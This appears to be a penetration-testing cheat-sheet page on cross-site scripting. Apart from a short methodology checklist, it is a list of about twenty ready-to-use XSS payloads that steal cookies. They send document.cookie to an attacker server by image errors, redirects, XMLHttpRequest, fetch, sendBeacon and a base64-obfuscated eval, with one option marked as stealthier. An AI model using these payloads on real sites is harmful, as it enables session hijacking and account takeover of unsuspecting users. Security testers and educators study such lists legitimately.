---
description: Cross-site Scripting
icon: spider-black-widow
---

# XSS

{% hint style="info" %}
## <mark style="color:purple;">Methodology</mark>

* [ ] <mark style="color:purple;">Look if any value you control is being reflected in the</mark> <mark style="color:orange;">**`HTML`**</mark> <mark style="color:purple;">or used by</mark> <mark style="color:orange;">**`Javascript`**</mark> <mark style="color:purple;">code.</mark>
* [ ] <mark style="color:purple;">**Find the context**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">where it's</mark> <mark style="color:orange;">**`reflected/used`**</mark><mark style="color:purple;">.</mark>

***

### <mark style="color:purple;">Reflected XSS</mark>

*


{% endhint %}

***

{% hint style="danger" %}
## <mark style="color:purple;">Stealing Cookies</mark>

### <mark style="color:purple;">Key Condition -></mark> <mark style="color:orange;">**`HttpOnly`**</mark> <mark style="color:purple;">needs to be set to</mark> <mark style="color:orange;">**`false`**</mark>&#x20;

* <mark style="color:purple;">Use when injecting into an image tag where an</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**error event triggers:**</mark>

```html
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
```

* <mark style="color:purple;">Use when you can inject an image and trigger a redirect via the</mark> <mark style="color:orange;">**`onerror`**</mark> <mark style="color:purple;">event:</mark>

```html
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
```

* <mark style="color:purple;">Use in situations where</mark> <mark style="color:orange;">**`JavaScript execution is possible`**</mark><mark style="color:purple;">, and you can send cookies via an image request with URL encoding:</mark>

```html
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
```

* <mark style="color:purple;">Use when</mark> <mark style="color:orange;">**`JavaScript execution is possible`**</mark><mark style="color:purple;">, and you need to send cookies using an</mark> <mark style="color:orange;">**`audio object`**</mark><mark style="color:purple;">:</mark>

```html
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
```

* <mark style="color:purple;">Use when</mark> <mark style="color:orange;">**`you can inject JavaScript`**</mark> <mark style="color:purple;">and want to redirect the user to a server with the cookies attached:</mark>

```html
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
```

* **Similar to the previous one; use when you can inject JavaScript to trigger a location change with cookies.**

```html
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
```

* **Use in scenarios where you can inject JavaScript to modify the `document.location` and send cookies.**

```html
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
```

* **Inject when you need to send cookies via `document.location.href` and trigger a redirect.**

```
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
```

* **Use when injecting JavaScript into a document to dynamically write an image that sends cookies.**

```
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
```

* **Use when JavaScript execution is allowed and you need to assign a location redirect with cookies.**

```
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
```

* **Similar to the previous one, use when you need to access `window.location` properties dynamically.**

```
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
```

* **Use when injecting JavaScript and need to modify `window.location.href` dynamically.**

```
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
```

* **Use when you can inject JavaScript and dynamically join the URL and cookies to redirect.**

```
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
```

* <mark style="color:purple;">Use when</mark> <mark style="color:orange;">**`JavaScript`**</mark> <mark style="color:purple;">execution is possible and you can send cookies using an image object.</mark>

```html
<script>var i=new Image(); i.src="http://10.10.14.6/?c="+document.cookie;</script>
```

* **Use when you need to redirect with concatenation of cookies into a URL.**

```
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
```

* **Use in scenarios where you can send cookies via an XMLHttpRequest, often when targeting XSS vulnerabilities.**

```
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
```

* **Use when you can inject base64-encoded JavaScript and execute it to send cookies.**

```
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
```

* **Use when JavaScript is injectable and you need to send cookies via `fetch` with `no-cors` mode to avoid response handling.**

```
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
```

* **Use when you want to send cookies asynchronously in the background using the `sendBeacon` API, typically for stealthier attacks.**

```
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
{% endhint %}

